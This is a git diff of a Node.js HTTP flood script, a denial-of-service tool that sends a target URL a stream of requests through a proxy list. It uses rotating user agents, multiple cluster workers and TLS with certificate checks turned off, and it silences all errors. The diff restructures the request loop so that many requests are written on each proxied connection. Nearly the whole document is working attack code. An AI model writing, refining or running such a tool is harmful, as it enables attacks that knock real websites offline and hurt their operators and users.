@@ -12,6 +12,8 @@ const tls = require('tls');
 const execSync = require('child_process').execSync;
 
 
+var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
+var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
 var target = process.argv[2];
 var time = process.argv[3];
 var thread = process.argv[5];
@@ -23,16 +25,12 @@ var fileName = __filename;
 var file = path.basename(fileName);
 
 
+process.on('uncaughtException', function() {});
+process.on('unhandledRejection', function() {});
+require('events').EventEmitter.defaultMaxListeners = Infinity;
 
-try {
-    var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
-    var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
-
-} catch (err) {
-
-    if (err.code !== 'ENOENT') throw err;
-    console.log('Check if everything is installed as it should');
-    process.exit();
+function getRandomNumberBetween(min, max) {
+    return Math.floor(Math.random() * (max - min + 1) + min);
 }
 
 global.logger = function() {
@@ -58,14 +56,6 @@ global.logger = function() {
 
     console.log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
 };
-
-process.on('uncaughtException', function() {});
-process.on('unhandledRejection', function() {});
-require('events').EventEmitter.defaultMaxListeners = Infinity;
-
-function getRandomNumberBetween(min, max) {
-    return Math.floor(Math.random() * (max - min + 1) + min);
-}
 
 var parsed = url.parse(target);
 process.setMaxListeners(15);
@@ -115,55 +105,53 @@ if (cluster.isPrimary) {
             req.setSocketKeepAlive(true);
         });
 
-    req.on('connect', function(res, socket, head) { //open raw request
-        tls.authorized = true;
-        tls.sync = true;
-        var TlsConnection = tls.connect({
-            ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-            secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
-            honorCipherOrder: true,
-            requestCert: true,
-            host: parsed.host,
-            port: 80,
-            secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
-            servername: parsed.host,
-            secure: true,
-            rejectUnauthorized: false,
-            socket: socket
-        }, function() {
-
-            for (let j = 0; j < rate; j++) {
-
+        req.on('connect', function(res, socket, head) { //open raw request
+            tls.authorized = true;
+            tls.sync = true;
+            var TlsConnection = tls.connect({
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
+                honorCipherOrder: true,
+                requestCert: true,
+                host: parsed.host,
+                port: 80,
+                secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
+                servername: parsed.host,
+                secure: true,
+                rejectUnauthorized: false,
+                socket: socket
+            }, function() {
                 TlsConnection.setKeepAlive(true, 10000)
                 TlsConnection.setTimeout(10000);
-                TlsConnection.write(`${method} ` + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
-            }
-        });
+                for (let j = 0; j < rate; j++) {
+                    TlsConnection.write(`${method} ` + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
+                }
+            });
 
-        TlsConnection.on('disconnected', () => {
-            TlsConnection.destroy();
-        });
+            TlsConnection.on('disconnected', () => {
+                TlsConnection.destroy();
+            });
 
-        TlsConnection.on('timeout', () => {
-            TlsConnection.destroy();
-        });
+            TlsConnection.on('timeout', () => {
+                TlsConnection.destroy();
+            });
 
-        TlsConnection.on('error', (err) => {
-            TlsConnection.destroy();
-        });
+            TlsConnection.on('error', (err) => {
+                TlsConnection.destroy();
+            });
 
-        TlsConnection.on('data', (chunk) => {
-            setTimeout(function() {
-                return delete TlsConnection
-            }, 10000);
-        });
+            TlsConnection.on('data', (chunk) => {
+                setTimeout(function() {
+                    return delete TlsConnection
+                }, 10000);
+            });
 
-        TlsConnection.on('end', () => {
-            TlsConnection.destroy();
-        });
+            TlsConnection.on('end', () => {
+                TlsConnection.destroy();
+            });
 
-    }).end()
-}, 0);
+        }).end()
+    }, 0);
 }
 
 
@@ -171,5 +159,6 @@ if (cluster.isPrimary) {
 setTimeout(() => {
     process.exit(1);
 }, time * 1000)
+
 
 logger('STARTING  :: ', target, 'FOR', time, 'MS');
